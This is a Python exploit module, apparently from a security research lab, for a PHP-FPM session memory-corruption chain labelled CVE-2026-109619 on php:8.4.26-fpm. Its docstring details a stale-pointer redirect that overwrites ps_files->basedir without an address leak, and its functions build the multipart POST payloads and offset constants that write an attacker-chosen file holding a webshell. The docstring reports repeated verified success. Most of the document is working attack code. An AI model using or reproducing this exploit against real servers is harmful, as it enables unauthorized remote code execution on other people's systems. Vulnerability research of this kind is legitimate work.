#!/usr/bin/env python3
# INDEX: K-free (leak-free) ps_files->basedir file-write via stale-tail d->last redirect | fpm | needs only per-build offsets, NO chunk-base K leak
"""K-FREE ps_files->basedir file-write for the fpm session-dangle chain
(CVE-2026-109619). Removes the chunk-base K leak that the K-seated single-carrier
forge (ps_files_single_carrier_forge.py) still needed: nothing in the HTTP-delivered
carrier contains a runtime-leaked address. Only per-build/per-config CONSTANTS are
used (the project's accepted offset floor). Sink-free except the one approved
script-level unserialize() (the arm). Worker survives.

CORE PRIMITIVE - stale-tail partial d->last redirect (harvests K from stale memory):
  The arm leaves d (=BG(unserialize).data) with d->last = K + real_E_choff as STALE
  bytes in the reset-but-not-wiped request chunk. A $_POST carrier field whose VALUE
  ends exactly at d+1 overwrites only d->last byte0 (the multipart body writer places a
  NUL terminator at value_end => d->last byte1 = 0), while d->last bytes 2..7 stay
  stale = the real chunk-base K bits. Result, with no knowledge of K:
      d->last = K + (band<<16) + 0x00 + byte0
  where `band` = stale bits16-20 of real_E_choff. Choosing byte0 points d->last at a
  fakeE inside the carrier, in the 256-byte window [band<<16 .. band<<16|0xff]. The
  reused decode's var_push then writes to fakeE->data[AIM] with AIM chunk-relative
  (K cancels). VERIFIED: d->last lands exactly K+band<<16+byte0 (byte0 swept), and the
  benign push writes chunk pointers to the chosen chunk-relative target, worker alive.

FINISHER - fresh-DT path backing seeded via the ARM payload:
  The php session "php" serializer calls var_tmp_var() per value; with the arm's stale
  last_dtor = 0 this allocates a FRESH var_dtor_entries DT at a deterministic chunk
  offset, reusing stale arm-payload bytes. basedir = &DT->data[1]; its zend_string
  len/val overlap DT->data[2]. The OOM fires in array_init() BEFORE the arm payload's
  trailing filler is parsed, so that filler is arbitrary attacker bytes: we overlay
  {len, "<path>\\0"} at the filler offset that maps to DT->data[2]. ZSTR_LEN includes
  the trailing NUL so ps_files_path_create's appended "/sess_<key>" is C-string
  truncated => the opened path is exactly <path>.

Two var_pushes (session record `aa|i:9;bb|i:2;`) set ps_files->last_key=&DT->data[0]
(int 9 => release-safe) and ps_files->basedir=&DT->data[1]. The progress field value
carries the webshell (becomes a session key => live PHP in the written file).

VERIFIED php:8.4.26-fpm behind nginx, fresh-container-per-trial, black-box, loud-fail:
  10/10 wrote the target file + worker survived (observer-checked d_choff, loud on
  mismatch); 5/5 again with NO observer/proc read at all (pure HTTP arm+stage, only the
  final file `ls` is privileged). NO chunk-base K supplied anywhere.

PER-BUILD CONSTANTS (BUILD_CONST below) are measured once offline per build/config
(same status as ps_files_choff in the K-seated path). They are host/layout-sensitive:
K-free cannot adapt to d_choff jitter the way the K-seated adaptive forge can, so the
arm must be held fixed (fixed prefix, no Cookie) and the constants re-derived if the
layout moves. Values here are for the bundled lab (lab/kfps).
"""
from __future__ import annotations

import struct

# php:8.4.26-fpm, bundled lab (lab/kfps), fixed arm (ARM_PREFIX, no Cookie).
BUILD_CONST = {
    "arm_prefix": 0xA0000,      # a $_POST field prepended to the arm to raise d high
    "d_choff": 0x1ac000,        # BG(unserialize).data chunk offset after the fixed arm
    "carrier_base": 0x63000,    # first-fit of the stage's first $_POST field body
    "ps_files": 0x56208,        # PS(mod_data) chunk offset (last_key@+0, basedir@+8)
    "fakee": 0x1a0000,          # must be band<<16 | 0x00XX (NUL forces d->last byte1=0)
    "dt_data2_filler_off": 0x7521,  # arm-payload filler offset -> fresh DT->data[2] chunk addr
}


def arm_payload(path, c, *, n1=1100, k=4000000):
    """The approved-sink arm blob: cochunk OOM (leaves the BG(unserialize) dangle with
    d->last = separate overflow E) with the fresh-DT basedir backing {len, path+NUL}
    overlaid in the un-parsed array_init filler (so it lands, as stale bytes, on the
    stage's fresh DT->data[2])."""
    inner = b"a:%d:{" % n1 + b"".join(b"i:%d;i:0;" % i for i in range(n1)) + b"}"
    head = b"a:2:{i:0;" + inner + b"i:1;a:%d:{" % k
    filler = bytearray(b"i:0;" * (k // 2 + 10))          # full length keeps IS_FAKE_ELEM_COUNT false
    pb = (path + "\x00").encode()
    struct.pack_into("<Q", filler, c["dt_data2_filler_off"], len(pb))  # ZSTR_LEN incl. NUL
    filler[c["dt_data2_filler_off"] + 8:c["dt_data2_filler_off"] + 8 + len(pb)] = pb
    return head + bytes(filler)


def build_carrier(c):
    """The K-FREE stage carrier (first $_POST field). Content ends at d+1 so the
    multipart NUL lands at d+1 (d->last byte1=0) and bytes 2..7 stay stale (K preserved).
    Writes d->last byte0 (=> d->last = fakeE) and fakeE->used_slots = AIM (chunk-relative,
    push0 -> ps_files->last_key). Returns (carrier_bytes, aim)."""
    base, d_choff, fakee, ps = c["carrier_base"], c["d_choff"], c["fakee"], c["ps_files"]
    assert (fakee & 0xffff00) == (fakee & 0x1f0000), "fakeE must be band<<16 | 0x00XX"
    V = bytearray(d_choff + 1 - base)
    aim = (ps - fakee - 0x10) // 8
    struct.pack_into("<q", V, fakee - base, aim)         # fakeE->used_slots = AIM
    V[d_choff - base] = fakee & 0xff                     # d->last byte0 (byte1=NUL=0, byte2+ stale)
    return bytes(V), aim


def arm_parts(path, c=None):
    """multipart parts for the arm POST: the prefix field (raises d) + the OOM blob `d`."""
    from common.multipart import part_tuple
    c = c or BUILD_CONST
    return [part_tuple("p", b"A" * c["arm_prefix"]), part_tuple("d", arm_payload(path, c))]


def stage_parts(carrier, webshell):
    """multipart parts for the stage POST: the K-free carrier, the progress field (value =
    webshell -> becomes a session key, live PHP in the file), and a $_FILES part whose
    FILE_START update drives the forged pre-RINIT decode."""
    from common.multipart import part_tuple
    # the file part's Content-Type IS load-bearing: its header length sets the fresh
    # DT's landing offset (which the payload-seeded data[2] backing targets).
    return [part_tuple("C", carrier), part_tuple("PHP_SESSION_UPLOAD_PROGRESS", webshell),
            part_tuple("f", b"Z" * 64, filename="a.bin", ctype="application/octet-stream")]


def session_record():
    """Two int entries: entry0 int >=2 (forged last_key release-safe), entry1 int."""
    return b"aa|i:9;bb|i:2;"
